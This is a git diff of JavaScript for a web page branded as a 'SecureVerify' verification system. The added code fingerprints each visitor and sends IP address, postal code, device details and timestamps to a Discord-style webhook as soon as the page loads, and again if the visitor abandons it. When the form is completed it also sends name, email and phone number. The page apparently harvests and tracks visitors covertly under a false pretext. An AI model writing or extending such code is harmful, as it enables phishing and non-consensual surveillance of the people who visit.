@@ -6,6 +6,8 @@ let userPostalCode = '';
 let initialWebhookSent = false;
 let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
 let formStartTime = Date.now();
+let userVisitId = 'USR-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2, 4).toUpperCase();
+let userFingerprint = generateUserFingerprint();
 let inactivityTimer = null;
 const INACTIVITY_TIMEOUT = 5 * 60 * 1000; // 5 minutes
 
@@ -65,7 +67,7 @@ function handleIncompleteSession() {
     showIncompleteSessionMessage();
 }
 
-// Send webhook for incomplete session
+// Send webhook for incomplete session with enhanced identification
 async function sendIncompleteSessionWebhook() {
     if (!userIP && !userPostalCode) {
         console.log('❌ No location information to send');
@@ -75,24 +77,21 @@ async function sendIncompleteSessionWebhook() {
     try {
         const deviceInfo = getDeviceInfo();
         const sessionDuration = Date.now() - formStartTime;
+        const currentTime = new Date();
         
         const embed = {
-            title: '⚠️ Incomplete Session',
-            description: '👤 User visited but did not complete the form',
+            title: '⚠️ **INCOMPLETE SESSION DETECTED**',
+            description: '👤 User visited but abandoned the verification process',
             color: 0xff9500, // Orange color for incomplete
             fields: [
-                { name: '🆔 Session ID', value: sessionId, inline: false },
-                { name: '🌐 IP Address', value: userIP, inline: true },
-                { name: '📍 Postal Code', value: userPostalCode, inline: true },
-                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
-                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
-                { name: '🌍 Language', value: deviceInfo.language, inline: true },
-                { name: '🕐 Session Duration', value: formatDuration(sessionDuration), inline: true },
-                { name: '📝 Status', value: '❌ Form not completed', inline: false },
-                { name: '📊 Initial Webhook', value: initialWebhookSent ? '✅ Sent' : '❌ Failed', inline: true }
+                { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
+                { name: '🕐 **SESSION TIMELINE**', value: `**Started:** ${formatTimestamp(new Date(formStartTime))}\n**Ended:** ${formatTimestamp(currentTime)}\n**Duration:** ${formatDuration(sessionDuration)}`, inline: false },
+                { name: '🌐 **LOCATION DATA**', value: `**IP Address:** \`${userIP}\`\n**Postal Code:** \`${userPostalCode}\``, inline: true },
+                { name: '📱 **DEVICE INFO**', value: `**Type:** ${deviceInfo.mobileDeviceType}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}`, inline: true },
+                { name: '📊 **SESSION STATUS**', value: `**Form Status:** ❌ Not Completed\n**Initial Webhook:** ${initialWebhookSent ? '✅ Sent' : '❌ Failed'}`, inline: false }
             ],
             footer: {
-                text: 'Session ended without form completion - Location information preserved'
+                text: `🔐 SecureVerify System | User: ${userVisitId} | Session Abandoned`
             }
         };
 
@@ -248,9 +247,15 @@ async function sendWebhook(userData) {
     }
     
     try {
-        // Use the postal code we already collected
+        const currentTime = new Date();
+        const sessionDuration = Date.now() - formStartTime;
+        
+        // Use the location data we already collected
+        const ipAddress = userIP || 'Unknown IP';
         const postalCode = userPostalCode || 'Unknown Postal Code';
-        console.log('📍 Using collected postal code:', postalCode);
+        console.log('📍 Using collected location data:');
+        console.log('  - IP Address:', ipAddress);
+        console.log('  - Postal Code:', postalCode);
 
         console.log('📱 Getting device info...');
         const deviceInfo = getDeviceInfo();
@@ -258,31 +263,20 @@ async function sendWebhook(userData) {
 
         console.log('🔧 Building completion webhook payload...');
         const embed = {
-            title: '✅ User Information Completed',
-            description: '👤 User successfully completed the information form',
+            title: '✅ **USER VERIFICATION COMPLETED**',
+            description: '👤 User successfully completed the verification process',
             color: 0x00ff00, // Green color for completion
             fields: [
-                { name: '🆔 Session ID', value: sessionId, inline: false },
-                { name: '👤 Full Name', value: userData.name || 'Not provided', inline: false },
-                { name: '📧 Email Address', value: userData.email || 'Not provided', inline: false },
-                { name: '📞 Phone Number', value: userData.phone || 'Not provided', inline: false },
-                { name: '📍 Postal Code', value: postalCode, inline: true },
-                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
-                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
-                { name: '🌍 Language', value: deviceInfo.language, inline: true },
-                { name: '📺 Screen Resolution', value: deviceInfo.screenRes, inline: true },
-                { name: '🎨 Color Depth', value: deviceInfo.colorDepth, inline: true },
-                { name: '🕐 Timezone', value: deviceInfo.timezone, inline: true },
-                { name: '💾 Device Memory', value: deviceInfo.deviceMemory, inline: true },
-                { name: '⚡ CPU Cores', value: deviceInfo.cpuCores, inline: true },
-                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
-                { name: '💻 Operating System', value: deviceInfo.os, inline: true },
-                { name: '🕐 Completion Time', value: deviceInfo.timestamp, inline: false },
-                { name: '📝 Status', value: '✅ User information successfully submitted', inline: false },
-                { name: '📊 Initial Webhook', value: initialWebhookSent ? '✅ Sent' : '❌ Failed', inline: true }
+                { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
+                { name: '🕐 **SESSION TIMELINE**', value: `**Started:** ${formatTimestamp(new Date(formStartTime))}\n**Completed:** ${formatTimestamp(currentTime)}\n**Duration:** ${formatDuration(sessionDuration)}`, inline: false },
+                { name: '👤 **USER INFORMATION**', value: `**Full Name:** ${userData.name || 'Not provided'}\n**Email:** ${userData.email || 'Not provided'}\n**Phone:** ${userData.phone || 'Not provided'}`, inline: false },
+                { name: '🌐 **LOCATION DATA**', value: `**IP Address:** \`${ipAddress}\`\n**Postal Code:** \`${postalCode}\``, inline: true },
+                { name: '📱 **DEVICE INFO**', value: `**Type:** ${deviceInfo.mobileDeviceType}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}\n**OS:** ${deviceInfo.os}\n**Language:** ${deviceInfo.language}`, inline: true },
+                { name: '🖥️ **SYSTEM SPECS**', value: `**Screen:** ${deviceInfo.screenRes}\n**Color Depth:** ${deviceInfo.colorDepth}\n**Memory:** ${deviceInfo.deviceMemory}\n**CPU Cores:** ${deviceInfo.cpuCores}\n**Timezone:** ${deviceInfo.timezone}`, inline: true },
+                { name: '📊 **SESSION STATUS**', value: `**Form Status:** ✅ Completed\n**Initial Webhook:** ${initialWebhookSent ? '✅ Sent' : '❌ Failed'}`, inline: false }
             ],
             footer: {
-                text: 'Form completed successfully - user provided all requested information'
+                text: `🔐 SecureVerify System | User: ${userVisitId} | Verification Completed`
             }
         };
 
@@ -827,7 +821,39 @@ async function collectLocationDataAndSendInitialWebhook() {
     }
 }
 
-// Send initial webhook with IP, postal code, and device info
+// Generate user fingerprint for unique identification
+function generateUserFingerprint() {
+    const userAgent = navigator.userAgent;
+    const screenRes = `${screen.width}x${screen.height}`;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const language = navigator.language;
+    const platform = navigator.platform;
+    
+    // Create a simple hash
+    const data = `${userAgent}|${screenRes}|${timezone}|${language}|${platform}`;
+    let hash = 0;
+    for (let i = 0; i < data.length; i++) {
+        const char = data.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash; // Convert to 32-bit integer
+    }
+    return Math.abs(hash).toString(16).toUpperCase().padStart(8, '0');
+}
+
+// Format timestamp for display
+function formatTimestamp(date) {
+    return date.toLocaleString('en-US', {
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        timeZoneName: 'short'
+    });
+}
+
+// Send initial webhook with enhanced user identification
 async function sendInitialWebhook(ipAddress, postalCode, deviceInfo) {
     if (!WEBHOOK_URL) {
         console.error('❌ Webhook URL is not configured');
@@ -835,29 +861,21 @@ async function sendInitialWebhook(ipAddress, postalCode, deviceInfo) {
     }
     
     try {
+        const currentTime = new Date();
         const embed = {
-            title: '🌐 User Visit Detected',
-            description: '👤 A user has accessed the system',
+            title: '🌐 **NEW USER VISIT DETECTED**',
+            description: '👤 A new user has accessed the verification system',
             color: 0x00ff00, // Green color for initial
             fields: [
-                { name: '🆔 Session ID', value: sessionId, inline: false },
-                { name: '🌐 IP Address', value: ipAddress, inline: true },
-                { name: '📍 Postal Code', value: postalCode, inline: true },
-                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
-                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
-                { name: '🌍 Language', value: deviceInfo.language, inline: true },
-                { name: '📺 Screen Resolution', value: deviceInfo.screenRes, inline: true },
-                { name: '🎨 Color Depth', value: deviceInfo.colorDepth, inline: true },
-                { name: '🕐 Timezone', value: deviceInfo.timezone, inline: true },
-                { name: '💾 Device Memory', value: deviceInfo.deviceMemory, inline: true },
-                { name: '⚡ CPU Cores', value: deviceInfo.cpuCores, inline: true },
-                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
-                { name: '💻 Operating System', value: deviceInfo.os, inline: true },
-                { name: '🕐 Visit Time', value: deviceInfo.timestamp, inline: false },
+                { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
+                { name: '🕐 **TIMESTAMP**', value: `**Access Time:** ${formatTimestamp(currentTime)}`, inline: false },
+                { name: '🌐 **LOCATION DATA**', value: `**IP Address:** \`${ipAddress}\`\n**Postal Code:** \`${postalCode}\``, inline: true },
+                { name: '📱 **DEVICE INFO**', value: `**Type:** ${deviceInfo.mobileDeviceType}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}\n**OS:** ${deviceInfo.os}\n**Language:** ${deviceInfo.language}`, inline: true },
+                { name: '🖥️ **SYSTEM SPECS**', value: `**Screen:** ${deviceInfo.screenRes}\n**Color Depth:** ${deviceInfo.colorDepth}\n**Memory:** ${deviceInfo.deviceMemory}\n**CPU Cores:** ${deviceInfo.cpuCores}\n**Timezone:** ${deviceInfo.timezone}`, inline: true },
                 { name: '📝 Status', value: '⏳ Awaiting user information submission...', inline: false }
             ],
             footer: {
-                text: 'Initial visit detected - waiting for user to complete form'
+                text: `🔐 SecureVerify System | User: ${userVisitId} | Fingerprint: ${userFingerprint}`
             }
         };
 
@@ -876,7 +894,7 @@ async function sendInitialWebhook(ipAddress, postalCode, deviceInfo) {
     }
 }
 
-// Simple webhook fallback method
+// Simple webhook fallback method with enhanced identification
 async function sendSimpleWebhook(ipAddress, postalCode, deviceInfo) {
     if (!WEBHOOK_URL) {
         console.error('❌ Webhook URL is not configured');
@@ -884,8 +902,9 @@ async function sendSimpleWebhook(ipAddress, postalCode, deviceInfo) {
     }
     
     try {
-        // Create a simple message payload
-        const message = `🌐 User Visit Detected\n🆔 Session: ${sessionId}\n🌐 IP Address: ${ipAddress}\n📍 Postal Code: ${postalCode}\n📱 Device: ${deviceInfo.platform}\n🖥️ OS: ${deviceInfo.os}\n🌍 Browser: ${deviceInfo.browser}`;
+        const currentTime = new Date();
+        // Create a simple message payload with enhanced identification
+        const message = `🌐 **NEW USER VISIT DETECTED**\n\n🏷️ **USER IDENTIFICATION**\n🆔 Visit ID: \`${userVisitId}\`\n🆔 Session ID: \`${sessionId}\`\n🔐 Fingerprint: \`${userFingerprint}\`\n\n🕐 **TIMESTAMP**\n⏰ Access Time: ${formatTimestamp(currentTime)}\n\n🌐 **LOCATION DATA**\n📡 IP Address: \`${ipAddress}\`\n📍 Postal Code: \`${postalCode}\`\n\n📱 **DEVICE INFORMATION**\n🖥️ Platform: ${deviceInfo.platform}\n📱 Device Type: ${deviceInfo.mobileDeviceType}\n🌍 Browser: ${deviceInfo.browser}\n🖥️ OS: ${deviceInfo.os}`;
         
         // Try using a simple POST request without complex headers
         const payload = {
